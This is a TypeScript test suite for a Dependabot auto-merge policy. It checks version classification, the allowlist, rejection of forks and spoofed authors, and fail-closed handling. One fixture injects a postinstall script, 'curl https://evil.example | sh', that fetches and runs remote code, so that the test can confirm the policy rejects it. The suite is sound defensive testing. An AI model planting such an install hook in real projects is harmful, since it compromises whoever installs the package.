import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { describe, it } from "node:test";
import { classify, decide, type PullRequestFacts } from "../../scripts/dependabot/policy.ts";

const baseManifest = JSON.parse(
  readFileSync(new URL("../../package.json", import.meta.url), "utf8"),
) as {
  dependencies: Record<string, string>;
  devDependencies: Record<string, string>;
  scripts: Record<string, string>;
};

function manifest(mutate: (m: typeof baseManifest) => void = () => {}): string {
  const copy = structuredClone(baseManifest);
  mutate(copy);
  return JSON.stringify(copy, null, 2);
}

function pr(overrides: Partial<PullRequestFacts> = {}): PullRequestFacts {
  return {
    number: 7,
    authorLogin: "dependabot[bot]",
    authorType: "Bot",
    headRepo: "gonzalomartinperez/pequeverso-assistant-web",
    baseRepo: "gonzalomartinperez/pequeverso-assistant-web",
    headRef: "dependabot/npm_and_yarn/develop/lucide-react-1.48.1",
    baseRef: "develop",
    headSha: "a".repeat(40),
    draft: false,
    labels: ["dependencies"],
    files: ["package.json", "package-lock.json"],
    commitAuthors: ["dependabot[bot]"],
    commitCommitters: ["dependabot[bot]"],
    basePackageJson: manifest(),
    headPackageJson: manifest((m) => {
      m.dependencies["lucide-react"] = "1.48.1";
    }),
    automation: undefined,
    ...overrides,
  };
}

const bump = (field: "dependencies" | "devDependencies", name: string, version: string) =>
  manifest((m) => {
    m[field][name] = version;
  });

describe("version classification", () => {
  it("classifies patch, minor, major, prerelease and unknown", () => {
    assert.equal(classify("1.48.0", "1.48.1"), "patch");
    assert.equal(classify("1.48.0", "1.49.0"), "minor");
    assert.equal(classify("1.48.0", "2.0.0"), "major");
    assert.equal(classify("1.48.0", "1.49.0-beta.1"), "prerelease");
    assert.equal(classify("^1.48.0", "^1.49.0"), "unknown");
    assert.equal(classify("1.49.0", "1.48.0"), "unknown");
  });

  it("treats a 0.x minor bump as breaking and a 0.x patch as a patch", () => {
    assert.equal(classify("0.7.1", "0.8.0"), "major");
    assert.equal(classify("0.7.1", "0.7.2"), "patch");
  });
});

describe("Dependabot auto-merge policy", () => {
  it("auto-merges an allowlisted patch, pinned to the evaluated head", () => {
    const decision = decide(pr());
    assert.equal(decision.verdict, "auto-merge");
    assert.equal(decision.verdict === "auto-merge" && decision.headSha, "a".repeat(40));
  });

  it("auto-merges an explicitly allowed minor update", () => {
    assert.equal(
      decide(pr({ headPackageJson: bump("dependencies", "lucide-react", "1.49.0") })).verdict,
      "auto-merge",
    );
  });

  it("requires review for a minor update outside the minor allowlist", () => {
    const decision = decide(
      pr({ headPackageJson: bump("dependencies", "tailwind-merge", "3.8.0") }),
    );
    assert.equal(decision.verdict, "manual");
    assert.match(decision.reasons.join(), /not on the minor allowlist/);
  });

  it("rejects major, prerelease and unknown updates", () => {
    for (const version of ["2.0.0", "1.49.0-rc.1", "latest"])
      assert.equal(
        decide(pr({ headPackageJson: bump("dependencies", "lucide-react", version) })).verdict,
        "manual",
        version,
      );
  });

  it("handles 0.x packages: patch allowed when allowlisted, minor never", () => {
    assert.equal(
      decide(pr({ headPackageJson: bump("dependencies", "class-variance-authority", "0.7.2") }))
        .verdict,
      "auto-merge",
    );
    assert.equal(
      decide(pr({ headPackageJson: bump("dependencies", "class-variance-authority", "0.8.0") }))
        .verdict,
      "manual",
    );
  });

  it("never auto-merges runtime, compiler, framework or test-engine updates, even patches", () => {
    for (const [field, name, version] of [
      ["dependencies", "next", "16.3.7"],
      ["dependencies", "react", "19.3.1"],
      ["devDependencies", "typescript", "7.0.3"],
      ["devDependencies", "tailwindcss", "4.3.4"],
      ["devDependencies", "@playwright/test", "1.63.1"],
    ] as const)
      assert.equal(
        decide(pr({ headPackageJson: bump(field, name, version) })).verdict,
        "manual",
        name,
      );
  });

  it("rejects a mixed-risk group when any member fails", () => {
    const head = manifest((m) => {
      m.dependencies["lucide-react"] = "1.48.1";
      m.dependencies.next = "16.3.7";
    });
    const decision = decide(pr({ headPackageJson: head }));
    assert.equal(decision.verdict, "manual");
    assert.equal(decision.updates.length, 2);
  });

  it("ignores spoofed titles, labels and branch names from a non-Dependabot author", () => {
    const decision = decide(
      pr({
        authorLogin: "someone",
        authorType: "User",
        labels: ["dependencies", "dependencies:auto-merge"],
        headRef: "dependabot/npm_and_yarn/develop/lucide-react-1.48.1",
      }),
    );
    assert.equal(decision.verdict, "manual");
    assert.match(decision.reasons.join(), /author is not dependabot/);
  });

  it("rejects a PR from a fork even if the author claims to be Dependabot", () => {
    assert.equal(decide(pr({ headRepo: "attacker/pequeverso-assistant-web" })).verdict, "manual");
  });

  it("rejects unexpected changed files (workflows, application code, Docker)", () => {
    for (const file of [
      ".github/workflows/quality.yml",
      "src/app/page.tsx",
      "Dockerfile",
      ".nvmrc",
    ])
      assert.equal(
        decide(pr({ files: ["package.json", "package-lock.json", file] })).verdict,
        "manual",
        file,
      );
  });

  it("rejects script, engine, added or removed package changes hidden in package.json", () => {
    const cases = [
      manifest((m) => {
        m.dependencies["lucide-react"] = "1.48.1";
        m.scripts.postinstall = "curl https://evil.example | sh";
      }),
      manifest((m) => {
        m.dependencies["lucide-react"] = "1.48.1";
        (m as Record<string, unknown>).engines = { node: ">=18" };
      }),
      manifest((m) => {
        m.dependencies["left-pad"] = "1.3.0";
      }),
      manifest((m) => {
        delete m.dependencies.clsx;
      }),
    ];
    for (const head of cases) assert.equal(decide(pr({ headPackageJson: head })).verdict, "manual");
  });

  it("requires review when a human (or anyone else) added commits to the PR", () => {
    assert.equal(
      decide(pr({ commitAuthors: ["dependabot[bot]", "gonzalomartinperez"] })).verdict,
      "manual",
    );
    assert.equal(
      decide(pr({ commitCommitters: ["dependabot[bot]", "gonzalomartinperez"] })).verdict,
      "manual",
    );
  });

  it("requires review for the wrong target branch (e.g. a security update against main)", () => {
    const decision = decide(pr({ baseRef: "main" }));
    assert.equal(decision.verdict, "manual");
    assert.match(decision.reasons.join(), /base branch is main/);
  });

  it("re-evaluates each head: a new ineligible head turns an approved PR back to manual", () => {
    const first = decide(pr());
    const pushed = decide(
      pr({ headSha: "b".repeat(40), files: ["package.json", "package-lock.json", "src/x.ts"] }),
    );
    assert.equal(first.verdict, "auto-merge");
    assert.equal(pushed.verdict, "manual");
  });

  it("requires review for lockfile-only maintenance", () => {
    const decision = decide(pr({ files: ["package-lock.json"], headPackageJson: manifest() }));
    assert.equal(decision.verdict, "manual");
    assert.match(decision.reasons.join(), /lockfile-only/);
  });

  it("can be paused globally or held per PR", () => {
    assert.equal(decide(pr({ automation: "off" })).verdict, "manual");
    assert.equal(decide(pr({ labels: ["dependencies", "dependencies:hold"] })).verdict, "manual");
    assert.equal(decide(pr({ draft: true })).verdict, "manual");
  });

  it("fails closed on unreadable manifests", () => {
    assert.equal(decide(pr({ headPackageJson: null })).verdict, "manual");
    assert.equal(decide(pr({ basePackageJson: "{not json" })).verdict, "manual");
  });
});

describe("merge gating stays native", () => {
  const workflow = readFileSync(
    new URL("../../.github/workflows/dependency-policy.yml", import.meta.url),
    "utf8",
  );
  const runner = readFileSync(new URL("../../scripts/dependabot/run.ts", import.meta.url), "utf8");

  it("never merges directly: it only enables auto-merge pinned to the evaluated head", () => {
    assert.match(
      runner,
      /enablePullRequestAutoMerge\(input: \{pullRequestId: \$id, mergeMethod: MERGE, expectedHeadOid: \$sha\}\)/,
    );
    assert.doesNotMatch(runner, /mergePullRequest|\/merge"|gh pr merge/);
  });

  it("runs trusted base-branch code without checking out or executing the PR head", () => {
    assert.match(workflow, /pull_request_target:/);
    assert.match(workflow, /ref: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/);
    assert.doesNotMatch(
      workflow,
      /head\.sha|head\.ref|npm (ci|install)|github\.event\.pull_request\.title/,
    );
    assert.match(workflow, /^permissions: \{\}$/m);
  });
});
